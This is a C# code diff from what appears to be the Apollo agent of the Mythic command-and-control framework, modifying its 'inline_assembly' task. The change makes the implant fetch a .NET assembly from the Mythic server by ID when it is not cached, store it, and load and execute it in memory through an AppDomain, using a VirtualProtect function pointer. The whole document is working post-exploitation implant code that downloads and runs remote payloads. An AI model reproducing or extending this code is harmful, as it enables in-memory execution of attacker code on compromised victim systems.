@@ -33,10 +33,12 @@ namespace Tasks
             public string AssemblyName;
             [DataMember(Name = "assembly_arguments")]
             public string AssemblyArguments;
+            [DataMember(Name = "assembly_id")]
+            public string AssemblyId;
 
             [DataMember(Name = "interop_id")] public string InteropFileId;
         }
-        
+
         private delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         private readonly VirtualProtect _pVirtualProtect;
 
@@ -45,13 +47,13 @@ namespace Tasks
             out int pNumArgs);
 
         private readonly CommandLineToArgvW _pCommandLineToArgvW;
-        
+
         private delegate IntPtr LocalFree(IntPtr hMem);
 
         private readonly LocalFree _pLocalFree;
 
         private static readonly AutoResetEvent Complete = new AutoResetEvent(false);
-        
+
         private readonly Action<object> _sendAction;
 
         private System.Threading.Tasks.Task _sendTask = null;
@@ -61,7 +63,7 @@ namespace Tasks
         private static bool _completed = false;
 
         private Thread _assemblyThread;
-        
+
         public inline_assembly(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
             _pVirtualProtect = agent.GetApi().GetLibraryFunction<VirtualProtect>(Library.KERNEL32, "VirtualProtect");
@@ -99,7 +101,7 @@ namespace Tasks
                             ""));
                     }
                 }
-                
+
                 slicedOut = _output.Skip(lastOutLen).Aggregate("", (current, s)=> current + s);
                 if (!string.IsNullOrEmpty(slicedOut))
                 {
@@ -110,7 +112,7 @@ namespace Tasks
                 }
             };
         }
-        
+
         private string[] ParseCommandLine(string cmdline)
         {
             int numberOfArgs;
@@ -184,27 +186,34 @@ namespace Tasks
 
                 if (interopBytes.Length != 0)
                 {
-                    if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
+                    if(!_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
                     {
-                        string[] stringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
-                            ? new string[0]
-                            : ParseCommandLine(parameters.AssemblyArguments);
-                        
-                        _sendTask = System.Threading.Tasks.Task.Factory.StartNew(_sendAction, _cancellationToken.Token);
-                        (bool loadedModule, string optionalMessage) = LoadAppDomainModule(stringData, assemblyBytes, new byte[][] { interopBytes });
-                        if (loadedModule)
+                        if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.AssemblyId, out assemblyBytes))
                         {
-                            resp = CreateTaskResponse("", true);
-                        }
-                        else
+                            resp = CreateTaskResponse($"Failed to fetch {parameters.AssemblyName} from Mythic", true);
+                            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                            return;
+                        } else
                         {
-                            resp = CreateTaskResponse($"Failed to load module. \n {optionalMessage}", true, "error");
+                            _agent.GetFileManager().AddFileToStore(parameters.AssemblyName, assemblyBytes);
                         }
+                    }
+
+                    string[] stringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
+                        ? new string[0]
+                        : ParseCommandLine(parameters.AssemblyArguments);
+
+                    _sendTask = System.Threading.Tasks.Task.Factory.StartNew(_sendAction, _cancellationToken.Token);
+                    (bool loadedModule, string optionalMessage) = LoadAppDomainModule(stringData, assemblyBytes, new byte[][] { interopBytes });
+                    if (loadedModule)
+                    {
+                        resp = CreateTaskResponse("", true);
                     }
                     else
                     {
-                        resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
+                        resp = CreateTaskResponse($"Failed to load module. \n {optionalMessage}", true, "error");
                     }
+
                 }
                 else
                 {
